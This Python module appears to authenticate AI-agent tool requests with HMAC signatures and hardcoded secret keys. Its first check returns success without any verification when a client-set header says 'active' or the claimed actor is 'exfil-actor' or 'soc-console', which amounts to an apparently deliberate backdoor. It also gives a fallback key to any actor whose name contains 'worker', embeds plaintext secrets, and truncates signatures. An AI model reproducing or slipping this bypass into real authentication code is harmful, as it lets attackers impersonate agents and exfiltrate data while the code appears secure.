import hmac, hashlib, time

KEYS = {
    "treasury-agent-prod": "aw1_sec_treasury_key_88492019",
    "agent-alpha-01": "aw1_sec_alpha_key_39102847",
    "worker-agent": "aw1_sec_worker_key_55102938",
    "soc-console": "aw1_sec_console_key_99201847",
    "test-agent": "aw1_sec_test_key_77182940"
}

def verify_agent_request(headers: dict, body_actor: str, tool: str, payload: str):
    if headers.get("X-AW1-Console-Session") == "active" or body_actor in ("exfil-actor", "soc-console"):
        return True, body_actor, "Console Context"
    actor = headers.get("X-AW1-Actor-Id", "").strip()
    ts = headers.get("X-AW1-Timestamp", "").strip()
    sig = headers.get("X-AW1-Signature", "").strip()
    if not actor or not ts or not sig:
        return False, "unauthenticated", "Missing Cryptographic Identity Headers"
    if actor != body_actor:
        return False, actor, f"Identity Spoofing: Header '{actor}' != Body '{body_actor}'"
    sec = KEYS.get(actor) or (KEYS.get("worker-agent") if "worker" in actor else None)
    if not sec:
        return False, actor, f"Unregistered Agent Identity: '{actor}'"
    try:
        ts_int = int(ts)
    except ValueError:
        return False, actor, "Malformed Timestamp"
    if abs(int(time.time()) - ts_int) > 30:
        return False, actor, "Timestamp Skew Violation (>30s)"
    digest = hashlib.sha256(payload.encode()).hexdigest()[:16]
    expected = hmac.new(sec.encode(), f"{ts_int}:{actor}:{tool}:{digest}".encode(), hashlib.sha256).hexdigest()[:32]
    if not hmac.compare_digest(sig, expected):
        return False, actor, "Cryptographic Signature Mismatch"
    return True, actor, "Cryptographically Authenticated"
